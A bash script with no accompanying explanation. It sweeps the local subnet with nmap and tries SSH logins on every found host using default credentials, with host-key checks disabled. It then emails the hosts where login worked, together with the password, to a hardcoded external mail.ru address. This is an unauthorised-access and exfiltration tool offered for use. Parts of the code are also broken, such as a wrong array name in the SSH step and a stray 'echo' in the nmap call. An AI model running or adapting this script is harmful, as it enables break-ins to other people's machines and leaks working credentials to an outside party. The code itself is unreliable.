#!/bin/bash
`mkdir /tmp/tmpremove/`
echo >/tmp/tmpremove/output 
echo >/tmp/tmpremove/last_out.txt
echo >/tmp/tmpremove/ip.txt
echo >/tmp/tmpremove/net_ip_file
declare arr_ip
declare out_arr
count=1
if [ $1 ]; then
    email=$1	
else
    email=pnairai28@mail.ru
fi
if [ $2 ]; then
    user=$2	
else
    user=student
fi
if [ $3 ]; then
    pass=$3
else
    pass=student
fi
format_ip=[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*
k=0

calc_net_ip_len()
{
if [  ! `which "ifdata"` ]
    then
 echo "Installing ifdata to get network interface info without parsing ifconfig output"
            sudo apt-get install moreutils
    fi
net_ip=`ifdata -pN eth0`
    echo $net_ip > /tmp/tmpremove/net_ip_file
    length=`wc -m /tmp/tmpremove/net_ip_file`
 length_ip=$(( ${length:0:2}-2 ))

echo $length_ip
}

get_net_ips()
{
    if [ ! `which "nmap"` ]
    then
echo "installing nmap(Network exploration tool and security)"
        sudo apt-get install nmap
    fi
nmap -sP -n echo ${net_ip:0:length_ip}0-250 >> /tmp/tmpremove/ip.txt
    p=$(cat /tmp/tmpremove/ip.txt)

    for j in $p; do
        if grep -q "$format_ip" <<< "$j" ; then
            arr_ip[$k]=$j
            echo ${arr_ip[$k]} >> /tmp/tmpremove/ip.txt
            echo $user@${arr_ip[$k]}
            ssh_to_ip
        fi
        ((k++))
    done

}

ssh_to_ip()
{
if [  ! `which "expect"` ]
            then
echo "installing expect (programmed dialogue with interactive programs)"
            sudo apt-get install expect
             fi
          /usr/bin/expect <<EOD >> output
spawn ssh -oStrictHostKeyChecking=no -oCheckHostIP=no $user@${arr[$k]}
expect "$user@${arr[$k]}\'s password:"
send "$pass\r"
expect "Last login" 
send "cd /developer\r"
EOD
}

get_succ_ssh_ips()
{
    output=`cat /tmp/tmpremove/output`
    for h in $output; do
        if grep -q "$user@$format_ip's"<<< "$h" || grep -q "Welcome"<<< "$h"; then
            out_arr[$count]=$h
           if grep -q "Welcome"<<< "$h"; then
             echo ${out_arr[$count-1]} >> /tmp/tmpremove/last_out.txt
           fi
            ((count++))
        fi
    done

	if [ -f /tmp/tmpremove/last_out.txt ]; then
		user_ip=$(cat /tmp/tmpremove/last_out.txt)
	else
		user_ip="Could not ssh to net ips by given user and pass."
	fi
}

install_email()
{
   if [ ! `which "sendemail"` ]
   then
	echo "Installing sendemail(command line SMTP email client)"
	sudo apt-get install sendemail
   fi
}

send_email()
{
    if grep  "@" <<< "$email"
    then
	`sendemail -f pnairai28@mail.ru -t $email -u "List of ip" -m "user_ip='$user_ip'" "password='$pass'"`
    fi
}

main()
{
    calc_net_ip_len
    get_net_ips
    get_succ_ssh_ips
    install_email
    send_email
}

main
